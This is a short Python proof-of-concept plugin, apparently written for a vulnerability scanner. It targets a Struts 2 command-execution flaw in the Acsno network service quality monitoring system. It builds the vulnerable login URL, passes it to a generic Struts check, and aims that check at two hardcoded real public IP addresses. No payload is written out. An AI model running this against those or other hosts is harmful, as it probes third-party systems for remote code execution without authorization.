#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  埃森诺网络服务质量检测系统 Struts 2命令执行 
Author    :  a
mail      :  a@lcx.cc
 

"""
import urllib.parse
 

def assign(service, arg):
    if service == 'acsno':
        arr = urllib.parse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    param_data = 'usercfg/user_loginUI.do'
    url = arg + param_data
    task_push('struts' ,url)
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('acsno', 'http://223.87.12.193/')[1]) #  
    audit(assign('acsno', 'http://60.255.46.54/')[1]) # 台